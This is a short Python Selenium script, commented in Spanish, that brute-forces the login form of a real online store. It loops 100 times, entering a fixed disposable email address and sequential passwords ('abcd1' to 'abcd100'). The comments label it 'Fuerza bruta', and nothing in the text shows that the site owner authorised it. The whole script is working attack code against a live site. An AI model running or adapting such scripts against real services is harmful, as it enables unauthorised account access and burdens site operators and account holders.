from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
import time, random, string
driver = webdriver.Chrome()
correo = "yennettoddemou-1020@yopmail.com"
#Abrir Trulustore
driver.get("https://www.aussar.es/iniciar-sesion")
passw = "abcd"
time.sleep(5) #deshacerse de popup manualmente
for i in range(100):
    #Fuerza bruta
    inputcorreo = driver.find_element(By.ID, "field-email")
    inputcorreo.clear()
    inputcorreo.send_keys(correo)
    inputpass = driver.find_element(By.ID, "field-password")
    inputpass.clear()
    print("Probando login con: " + passw+str(i+1))
    inputpass.send_keys(passw+str(i+1))
    inputpass.send_keys(Keys.ENTER)
    time.sleep(2)